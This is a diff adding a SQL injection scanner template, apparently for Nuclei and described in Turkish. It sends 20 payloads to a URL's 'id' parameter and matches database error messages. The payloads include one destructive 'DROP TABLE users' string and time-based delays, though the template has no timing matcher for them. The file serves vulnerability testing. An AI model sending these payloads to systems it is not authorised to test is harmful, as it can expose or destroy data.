@@ -1,0 +1,60 @@
+id: custom-sqli-parameter-test
+info:
+  name: Gelişmiş SQLi id parametresi testi (20 payload)
+  author: aynur karadağ
+  description: |
+    URL’deki `id` parametresine 20 farklı yaygın SQL enjeksiyon payload’ı göndererek
+    hem hata tabanlı hem de time-based injeksiyon denemesi yapar.
+  severity: medium
+  reference: https://owasp.org/www-community/attacks/SQL_Injection
+  tags: sqli,injection,http
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id={{sqli}}"
+    payloads:
+      sqli:
+        - "1' OR '1'='1"
+        - "1' OR '1'='1' -- "
+        - "1' AND '1'='1"
+        - "1' UNION SELECT NULL--"
+        - "1' AND SLEEP(5)--"
+        - "' OR '1'='1' --"
+        - "' OR '1'='1' #"
+        - "1) OR (1=1"
+        - "1'; DROP TABLE users; --"
+        - "1' OR 'a'='a"
+        - "1' AND 'a'='a"
+        - "' OR 1=1--"
+        - "' OR 'x'='x'--"
+        - "admin' --"
+        - "admin' #"
+        - "1' AND EXTRACTVALUE(1,concat(0x5c,user()))--"
+        - "1' AND (SELECT COUNT(*) FROM users) > 0--"
+        - "1; WAITFOR DELAY '0:0:5' --"
+        - "' OR EXISTS(SELECT * FROM users)--"
+        - "' OR SLEEP(10)--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "(?i)you have an error in your sql syntax"
+          - "(?i)unclosed quotation mark"
+          - "(?i)mysql_fetch"
+          - "(?i)syntax error"
+          - "(?i)syntax error.*?mysql"
+          - "(?i)mariadb.*?syntax"
+          - "(?i)pg_query\\("
+          - "(?i)ERROR:\\s+relation\\s+.*does not exist"
+          - "(?i)ORA-[0-9]{5}"
+          - "(?i)SQLite\\/JDBCDriver"
+          - "(?i)System\\.Data\\.SqlClient\\.SqlException"
+          - "(?i)Microsoft OLE DB Provider"
+          - "(?i)ODBC SQL Server Driver"
+          - "(?i)SQLSTATE\\[HY000\\]"
+          - "(?i)unterminated quoted string"
+          - "(?i)invalid input syntax for"
